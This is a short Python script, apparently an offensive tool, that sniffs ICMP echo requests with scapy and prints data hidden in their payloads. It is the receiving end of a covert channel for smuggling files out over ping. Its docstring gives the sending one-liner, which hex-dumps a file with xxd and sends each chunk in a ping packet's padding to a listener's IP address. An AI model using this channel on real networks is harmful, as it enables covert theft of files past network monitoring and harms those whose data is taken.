#!/usr/bin/env python3
import argparse
from scapy.all import *

"""
Simple exfiltration using ping
xxd -p -c <chunk_size> <file> | while read line; do ping -c 1 -p "$line" <ip>; done
"""

config = None

def process_packet(pkt):
    data = pkt.lastlayer().load
    chunk = data[8:8+config.chunk_size].decode('latin1')
    print(f'{chunk}', flush=True, end='')


def main():
    global config
    parser = argparse.ArgumentParser(description='Exfiltrate files with ping')
    parser.add_argument('-s', '--chunk-size', dest='chunk_size', type=int, default=2, help='The number of bytes for each ping packet')
    parser.add_argument('-i', '--interface', dest='interface', type=str, default='eth0', help='The interface to listen on')
    config = parser.parse_args()
    sniff(filter='icmp[icmptype] == 8', iface=config.interface, prn=process_packet)

if __name__ == '__main__':
    main()
